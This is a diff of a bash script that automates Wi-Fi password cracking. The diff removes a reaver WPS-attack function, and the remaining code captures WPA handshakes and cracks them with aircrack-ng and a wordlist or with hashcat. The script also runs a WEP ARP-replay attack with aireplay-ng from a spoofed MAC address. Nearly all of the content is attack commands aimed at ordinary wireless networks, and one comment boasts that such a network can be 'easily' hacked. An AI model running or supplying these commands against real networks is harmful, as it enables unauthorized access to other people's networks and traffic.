@@ -12,19 +12,10 @@ MONFACE=wlan1mon
 
 TPGTARGETID=
 
-for TARGET in $TPGTARGETID
+for i in $TPGTARGETID
 do
     hitEm
 done
-
-reav(){
-    airmon-ng stop $INTERF
-    # find out if the WPS i enable or not for that we can use command:
-    wash -i $INTERF -c $CHANNEL -C -s
-    # if the WPS is not enabled then we can easily hack the wifi using reaver
-    reaver -i $INTERF -b $TARGETMAC –fail-wait=360
-}
-
 
 hitEm(){
     BSSID=$1
@@ -44,23 +35,23 @@ hitEm(){
     echo "offline from here -- if you have a good valid handshake"
     # crack w/ password list
     aircrack-ng $LOOTDIR/$CHANNEL-$BSSID.cap -w $WORDLISTDIR/$WORDLIST
-    
+
 }
 
 otherOptions(){
-    
+
     ########## or crack password with naive-hashcat ##########
     # convert cap to hccapx
     cap2hccapx.bin capture/-01.cap capture/-01.hccapx
     # crack with naive-hashcat
     HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
-    
-    
-    
+
+
+
     ######## or WEP ones using IVs #####
     ## spoof and ARP attack
     # We will be capturing an ARP packet and then replaying that ARP thousands of times in order to generate the IVs that we need to crack WEP.
-    
+
     aireplay-ng -3 -b $BSSID -h $MAC2SPOOF $MONFACE
     # once you have thousands of IVs ...
     aircrack-ng $WEPFILE.cap
